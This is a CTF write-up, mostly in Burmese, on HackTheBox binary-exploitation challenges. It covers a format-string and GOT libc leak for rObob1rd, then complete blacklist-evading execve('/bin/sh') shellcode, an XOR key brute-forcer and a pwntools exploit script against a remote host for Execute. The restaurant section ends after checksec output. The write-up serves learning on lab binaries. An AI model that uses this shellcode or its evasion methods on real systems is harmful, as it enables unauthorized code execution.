

#### rObob1rd

```c
wndbg> checksec
File:     /home/Jackfruit/cate/learn/binary/stack/htb/rObob1rd/r0bob1rd
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'./glibc/'
Stripped:   No

```

GOT overwrite လို့ရတယ်
PIE enable ဆိုတော့ ‌address leak လို့ကောင်းတာပေါ့
ကိုယ်ပိုင် `glibc` နဲ့ run ခိုင်းတယ်
အဆင်ပြေတယ် `glibc` version ရှာစရာမလိုတော့


```c

undefined8 main(void)

{
  ignore_me_init_buffering();
  ignore_me_init_signal();
  banner();
  printRobobirds(robobirdNames);
  operation();
  return 0;
}

```

```c

void operation(void)

{
  long in_FS_OFFSET;
  int local_7c;
  char printf_var [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("\nSelect a R0bob1rd > ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00400eb5,&local_7c);
  if ((local_7c < 0) || (9 < local_7c)) {
     printf("\nYou\'ve chosen: %s",robobirdNames + (long)local_7c * 8);
  }
  else {
     printf("\nYou\'ve chosen: %s",*(undefined8 *)(robobirdNames + (long)local_7c * 8));
  }
  getchar();
  puts("\n\nEnter bird\'s little description");
  printf("> ");
  fgets(printf_var,106,stdin);
  puts("Crafting..");
  usleep(2000000);
  start_screen();
  puts("[Description]");
  printf(printf_var);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                         /* WARNING: Subroutine does not return */
     __stack_chk_fail();
  }
  return;
}

```

ဘာမြင်လဲဆို ထုံးစံအတိုင်း format string မြင်တယ် ` fgets(printf_var,106,stdin);` ကလည်း နည်းနည်း 2 byte boundထပ်ကျော်နေတယ်
```c
  puts("\n\nEnter bird\'s little description");
  printf("> ");
  fgets(printf_var,106,stdin);
  puts("Crafting..");
  usleep(2000000);
  start_screen();
  puts("[Description]");
  printf(printf_var);
```


```python
  __isoc99_scanf(&DAT_00400eb5,&local_7c);
  if ((local_7c < 0) || (9 < local_7c)) {
     printf("\nYou\'ve chosen: %s",robobirdNames + (long)local_7c * 8);
  }
  else {
     printf("\nYou\'ve chosen: %s",*(undefined8 *)(robobirdNames + (long)local_7c * 8));
  }
```

အစက ဒီကောင်ကိုသတိမထားမိဘူး 
 first user input (number) မှာတင်  `libc` address  leak ဖို့ ငါတို့ chance ရှိတယ်
 initialized global variable မှာသိမ်းထားတဲ့ array တွေကိုပြပေးတယ်

```c
                             robobirdNames                                   XREF[5]:     Entry Point(*), 
                                                                                          operation:00400b35(*), 
                                                                                          operation:00400b3c(*), 
                                                                                          operation:00400b63(*), 
                                                                                          main:00400c3c(*)  
        006020a0 e8 0c 40        undefine
                 00 00 00 
                 00 00 f2 
           006020a0 e8              undefined1E8h                     [0]           ?  ->  00400ce8     XREF[5]:     Entry Point(*), 
                                                                                                                     operation:00400b35(*), 
                                                                                                                     operation:00400b3c(*), 
                                                                                                                     operation:00400b63(*), 
                                                                                                                     main:00400c3c(*)  
           006020a1 0c              undefined10Ch                     [1]
           006020a2 40              undefined140h                     [2]
           006020a3 00              undefined100h                     [3]
           006020a4 00              undefined100h                     [4]
           006020a5 00              undefined100h                     [5]
           006020a6 00              undefined100h                     [6]
           006020a7 00              undefined100h                     [7]
           006020a8 f2              undefined1F2h                     [8]           ?  ->  00400cf2
           006020a9 0c              undefined10Ch                     [9]
           006020aa 40              undefined140h                     [10]
           006020ab 00              undefined100h                     [11]
           006020ac 00              undefined100h                     [12]
           006020ad 00              undefined100h                     [13]
           006020ae 00              undefined100h                     [14]
           006020af 00              undefined100h                     [15]
           006020b0 ff              undefined1FFh                     [16]          ?  ->  00400cff

....


```

	006020a1 ကနေ 8 byte ဆီ မြှောက်ပြီး ရွေ့ပြီးပြပေးတယ် ဆိုတော့ 8 byte မှာ 1x (1ဆ)ပေါ့
ဆိုတော့ ငါတို့ ဒီကနေ GOT address တစ်ခုခုကို leak ပြီး` libc base `တွက်မယ်
NO PIE ဆို‌တော့ PLT address နဲ့ GOT entry address တွေက fixed ဖြစ်နေမှာဘဲ

```c
State of the GOT of /home/Jackfruit/cate/learn/binary/stack/htb/rObob1rd/r0bob1rd:
GOT protection: Partial RELRO | Found 12 GOT entries passing the filter
[0x602018] _exit@GLIBC_2.2.5 -> 0x400766 (_exit@plt+6) ◂— push 0 /* 'h' */
[0x602020] puts@GLIBC_2.2.5 -> 0x400776 (puts@plt+6) ◂— push 1
[0x602028] __stack_chk_fail@GLIBC_2.4 -> 0x400786 (__stack_chk_fail@plt+6) ◂— push 2
[0x602030] printf@GLIBC_2.2.5 -> 0x400796 (printf@plt+6) ◂— push 3
[0x602038] alarm@GLIBC_2.2.5 -> 0x4007a6 (alarm@plt+6) ◂— push 4
[0x602040] fgets@GLIBC_2.2.5 -> 0x4007b6 (fgets@plt+6) ◂— push 5
[0x602048] getchar@GLIBC_2.2.5 -> 0x4007c6 (getchar@plt+6) ◂— push 6
[0x602050] signal@GLIBC_2.2.5 -> 0x4007d6 (signal@plt+6) ◂— push 7
[0x602058] fflush@GLIBC_2.2.5 -> 0x4007e6 (fflush@plt+6) ◂— push 8
[0x602060] setvbuf@GLIBC_2.2.5 -> 0x4007f6 (setvbuf@plt+6) ◂— push 9 /* 'h\t' */
[0x602068] __isoc99_scanf@GLIBC_2.7 -> 0x400806 (__isoc99_scanf@plt+6) ◂— push 0xa /* 'h\n' */
[0x602070] usleep@GLIBC_2.2.5 -> 0x400816 (usleep@plt+6) ◂— push 0xb /* 'h\x0b' */

```

`0x602030 မှာရှိတဲ့ printf GOT `ကို leak မယ်
006020a0 ကနေ 0x602030 ဆိုတော့ ငယ်သွားမှာဆိုတော့ minus(-) သုံးရမယ်
112 (0x70) byte ကွာခြားမှုရှိတယ် 14 ဆဖြစ်မယ်
ဆိုတော့ -14 ဖြစ်မယ်
GOT address ရလာရင် libc base တွက်မယ်


```c
└─$ one_gadget glibc/libc.so.6 
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

```

ပြီးရင် one gadget ရှာပြီး `libc  base` နဲ့ပေါင်းမယ်








----

#### Execute

```c

undefined8 main(void)

{
  int iVar1;
  ulong userlength;
  size_t local_78length;
  long in_FS_OFFSET;
  char local_78 [32];
  undefined1 userinput [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_78[0] = ';';
  local_78[1] = 'T';
  local_78[2] = 'b';
  local_78[3] = 'i';
  local_78[4] = 'n';
  local_78[5] = 's';
  local_78[6] = 'h';
  local_78[7] = -10;
  local_78[8] = -0x2e;
  local_78[9] = -0x40;
  local_78[10] = '_';
  local_78[0xb] = -0x37;
  local_78[0xc] = 'f';
  local_78[0xd] = 'l';
  local_78[0xe] = 'a';
  local_78[0xf] = 'g';
  local_78[0x10] = 0;
  setup();
  puts("Hey, just because I am hungry doesn\'t mean I\'ll execute everything");
  userlength = read(0,userinput,60);
  local_78length = strlen(local_78);
  iVar1 = check(local_78,userinput,userlength & 0xffffffff,local_78length & 0xffffffff);
  if (iVar1 == 0) {
     puts("Hehe, told you... won\'t accept everything");
                            /* WARNING: Subroutine does not return */
     exit(0x539);
  }
  (*(code *)userinput)();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                            /* WARNING: Subroutine does not return */
     __stack_chk_fail();
  }
  return 0;
}


```


ရိုးရိုးရှင်းရှင်းပါဘဲ
ဒါမဲ့ မရိုးရှင်းဘူး

```c
 (*(code *)userinput)();
```
user input တောင်းတယ် 
ပြီးရင် user input ကို function အနေနဲ့ run ပေးတယ်

ဒါမဲ့ filter function ရှိတယ်

```c

undefined8 check(long local_78,long user_input,int user_inputlength(no_\n),int local_78_length)

{
  int local_10;
  int i;
  
  local_10 = 0;
  do {
     if (local_78_length <= local_10) {
        return 0x539;
     }
     for (i = 0; i < user_inputlength(no_\n) + -1; i = i + 1) {
        if (*(char *)(local_78 + local_10) == *(char *)(user_input + i)) {
           return 0;
        }
     }
     local_10 = local_10 + 1;
  } while( true );
}


```


filter ကိုကျော်ဖြတ်ရမယ်
ဆိုတော့ အရင်ဆုံး shell execution assembly ရေးကြည့်မယ်
ပြီးရင် filter နဲ့ ငြိမငြိ စစ်လိုက်မယ်

```python
from pwn import *
context.update(arch='amd64', os='linux')


blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"


shellcode = '''    
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
'''

sc = asm(shellcode)


sc = asm(shellcode)
print(sc)
for byte in sc:
    if byte in blacklist:
        print(f'BAD BYTE --> 0x{byte:02x}')
        print(f'ASCII --> {chr(byte)}')
```

```
─$ python test.py 
b'H\xb8/bin/sh\x00PH\x89\xe7H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05'
BAD BYTE --> 0x62
ASCII --> b
BAD BYTE --> 0x69
ASCII --> i
BAD BYTE --> 0x6e
ASCII --> n
BAD BYTE --> 0x73
ASCII --> s
BAD BYTE --> 0x68
ASCII --> h
BAD BYTE --> 0xf6
ASCII --> ö
BAD BYTE --> 0xd2
ASCII --> Ò
BAD BYTE --> 0xc0
ASCII --> À
BAD BYTE --> 0x3b
ASCII --> ;
             
```

ဒီမှာဆို filterငြိတဲ့ကောင်တွေထွက်လာတယ်
`binsh` ကထားပါတော့ 
0x3bကို အရင်ပြင်လို့ရတယ်

```c
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
push 0x3a
pop rax
add al, 0x1
syscall
```

```
 └─$ python test.py
b'H\xb8/bin/sh\x00PH\x89\xe7H1\xf6H1\xd2j:X\x04\x01\x0f\x05'
BAD BYTE --> 0x62
ASCII --> b
BAD BYTE --> 0x69
ASCII --> i
BAD BYTE --> 0x6e
ASCII --> n
BAD BYTE --> 0x73
ASCII --> s
BAD BYTE --> 0x68
ASCII --> h
BAD BYTE --> 0xf6
ASCII --> ö
BAD BYTE --> 0xd2
ASCII --> Ò
               
```



0x3a ကို stack ပေါ်တင်ပြီး 
`rax` ထဲထည့် `al` ကို `0x1` ပေါင်းပေးလိုက်ရင်
`0x3b` ရတယ်


```c
mov rax, 0x3a
add al, 0x1
```
ဒါမျိုးသုံးလို့မရဘူးလားဆို
ရတယ်
ဒါမဲ့ အခြား bad byte နဲ့သွားငြိနေတယ်

```
└─$ python test.py
b'H\xb8/bin/sh\x00PH\x89\xe7H1\xf6H1\xd2H\xc7\xc0:\x00\x00\x00\x04\x01\x0f\x05'
BAD BYTE --> 0x62
ASCII --> b
BAD BYTE --> 0x69
ASCII --> i
BAD BYTE --> 0x6e
ASCII --> n
BAD BYTE --> 0x73
ASCII --> s
BAD BYTE --> 0x68
ASCII --> h
BAD BYTE --> 0xf6
ASCII --> ö
BAD BYTE --> 0xd2
ASCII --> Ò
BAD BYTE --> 0xc0
ASCII --> À
             
```




ဆိုတော့ ငါတို့ ဒီအခြေအနေဘဲရှိသေးတယ်
```
 └─$ python test.py
b'H\xb8/bin/sh\x00PH\x89\xe7H1\xf6H1\xd2j:X\x04\x01\x0f\x05'
BAD BYTE --> 0x62
ASCII --> b
BAD BYTE --> 0x69
ASCII --> i
BAD BYTE --> 0x6e
ASCII --> n
BAD BYTE --> 0x73
ASCII --> s
BAD BYTE --> 0x68
ASCII --> h
BAD BYTE --> 0xf6
ASCII --> ö
BAD BYTE --> 0xd2
ASCII --> Ò
```

```c
xor rsi, rsi
xor rdx, rdx
```
ဘာလို့ဆို
- **`xor rsi, rsi`** → `0x48 0x31 0xF6`
- **`xor rdx, rdx`** → `0x48 0x31 0xD2`

အဲအစား
```c
push 0x0
pop rsi
push 0x0
pop rdx
```
ပြင်ရေးလိုက်ရင်

```python
from pwn import *
context.update(arch='amd64', os='linux')


blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"


shellcode = '''    
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
push 0x0
pop rsi
push 0x0
pop rdx
push  0x3a
pop rax
add al, 0x1
syscall
'''

sc = asm(shellcode)


sc = asm(shellcode)
print(sc)
for byte in sc:
    if byte in blacklist:
        print(f'BAD BYTE --> 0x{byte:02x}')
        print(f'ASCII --> {chr(byte)}')

```

```
└─$ python test.py
b'H\xb8/bin/sh\x00PH\x89\xe7j\x00^j\x00Zj:X\x04\x01\x0f\x05'
BAD BYTE --> 0x62
ASCII --> b
BAD BYTE --> 0x69
ASCII --> i
BAD BYTE --> 0x6e
ASCII --> n
BAD BYTE --> 0x73
ASCII --> s
BAD BYTE --> 0x68
ASCII --> h

```




XOR Key ကို `RAX` ထဲထည့်ပြီး Stack ပေါ်ကို `push` လုပ်လိုက်
XOR decoded text ကို Assembler ကို ကြိုတင်တွက်ချက်ခိုင်းလိုက်ပြီး `RAX` ထဲထည့်
ပြီးရင်
လက်ရှိ Stack ပေါ်မှာ ရှိနေတဲ့ `Key` နဲ့ XOR decoded text  ကို XOR လုပ်ပြီး
stack ပေါ်ပြန်ထည့်
ပြီးရင် ငါတို့ လိုချင်တဲ့ `rdi` ထဲထည့်လိုက် 

```
mov rax, 0x2a2a2a2a2a2a2a2a
push rax

mov rax, 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f
xor [rsp], rax
mov rdi, rsp

push 0x0
pop rsi
push 0x0
pop rdx

push 0x3a
pop rax
add al, 0x1
syscall
```
ဒီမှာဆို assembler တွေက ကြိုတင်တွက်ချက်မှု (Evaluation) တွေကို လုပ်ပေးတယ် `mov rax, 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f`
- အလုပ်လုပ်မည့် အခြေအနေ `0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f`
- အလုပ်မလုပ်မည့် အခြေအနေ `mov rax, rbx ^ 0x68732f6e69622f`


ဒါက XOR key ရှာတာ
```python
#!/usr/bin/env python3

# ၁။ မူရင်း string ကို byte အနေနဲ့ သတ်မှတ်ပါ (8 bytes ပြည့်အောင် အနောက်မှာ null သို့မဟုတ် space အုပ်ပေးရပါတယ်)
# /bin/sh က 7 bytes ပဲရှိလို့ အရှေ့မှာ 0x00 တစ်လုံး ပါနေတတ်ပါတယ်။ 
# ဒါကြောင့် အဆင်ပြေအောင် '//bin/sh' (8 bytes) လို့ အသုံးများပါတယ်။
original_string = b"//bin/sh" 

# ၂။ အစ်ကို့ challenge ရဲ့ Blacklist (Bad Bytes) တွေကို ဒီထဲမှာ ထည့်ပါ
# ဥပမာ - 0x00 (Null), 0x0a (Newline) နဲ့ အစ်ကို့ရဲ့ local_78 ထဲက ကောင်အချို့
blacklist = [
    0x3b,   # ';'
    0x54,   # 'T'
    0x62,   # 'b'
    0x69,   # 'i'
    0x6e,   # 'n'
    0x73,   # 's'
    0x68,   # 'h'
    -10,    # (or 0xf6 for unsigned representation)
    -0x2e,  # -46
    -0x40,  # -64
    0x5f,   # '_'
    -0x37,  # -55
    0x66,   # 'f'
    0x6c,   # 'l'
    0x61,   # 'a'
    0x67,   # 'g'
    0x00    # null terminator
]

print("[*] Scanning for valid 1-byte repeating XOR keys...")
print("-" * 50)

# ၃။ 1-byte key (0x01 မှ 0xFF) အထိကို Bruteforce ပတ်ပါမယ်
# (0x2a2a2a2a2a2a2a2a ဆိုတာ 0x2a ကို 8 ကြိမ် ထပ်ထားတာ ဖြစ်လို့ 1-byte bruteforce နဲ့ မိပါတယ်)
found_any = False

for k in range(1, 256):
    # ကာကွယ်ရေး - Key ကိုယ်တိုင်က blacklist ထဲမှာ ပါနေရင် ကျော်မယ်
    if k in blacklist:
        continue
        
    # ရွေးချယ်ထားတဲ့ key နဲ့ original string ကို byte တစ်လုံးချင်းစီ လိုက် XOR လုပ်မယ်
    xored_output = bytearray()
    bad_byte_found = False
    
    for b in original_string:
        xored_byte = b ^ k
        # ရလာတဲ့ ရလဒ် byte က blacklist ထဲမှာ ပါနေရင် ဒီ key ကို ပယ်မယ်
        if xored_byte in blacklist:
            bad_byte_found = True
            break
        xored_output.append(xored_byte)
        
    # အကယ်၍ Key ထဲမှာရော၊ ရလဒ်ထဲမှာရော bad byte မပါဘူးဆိုရင်... ဒါ ကျွန်တော်တို့ လိုချင်တဲ့ Key ပဲ!
    if not bad_byte_found:
        found_any = True
        # 8-byte key ကြီးအဖြစ် ပြောင်းလဲ သတ်မှတ်ပြတာပါ (e.g., 0x2a2a2a2a2a2a2a2a)
        full_key_hex = f"0x{bytes([k]*8).hex()}"
        full_result_hex = f"0x{bytes(xored_output[::-1]).hex()}" # Little-endian ပုံစံ push ဖို့ အနောက်ကနေ ပြန်လှန်ပြတာပါ
        
        print(f"[+] FOUND VALID KEY: 0x{k:02x} (ASCII: {chr(k)!r})")
        print(f"    -> Full 8-Byte Key   : {full_key_hex}")
        print(f"    -> XORed Value (RAX) : {full_result_hex}\n")

if not found_any:
    print("[-] No single-byte repeating key found. You might need a multi-byte key pattern!")
```



exploit script 
```python
from pwn import *
context.update(arch='amd64', os='linux')

context.log_level = 'debug'
context.binary = "./execute"
elf = context.binary

def start():
    if args.R:
        return remote("154.57.164.66", 30998)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            continue
        ''')
    else:
        return process(elf.path)


def exploit(io):
    shellcode = '''    
    mov rax, 0x2a2a2a2a2a2a2a2a
    push rax

    mov rax, 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f
    xor [rsp], rax
    mov rdi, rsp

    push 0x0
    pop rsi
    push 0x0
    pop rdx

    push 0x3a
    pop rax
    add al, 0x1
    syscall
    '''

    sc = asm(shellcode)
    io.recvline()
    io.sendline(sc)
    io.interactive()



if __name__ == '__main__':
    io = start()
    exploit(io)
```


---

#### restaurant

```c
pwndbg> checksec
File:     /home/Jackfruit/cate/learn/binary/stack/htb/restaurant/pwn_restaurant/restaurant
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
pwndbg> 

```

buffer overflow လို့ရမယ်
fixed address တွေဖြစ်တယ်

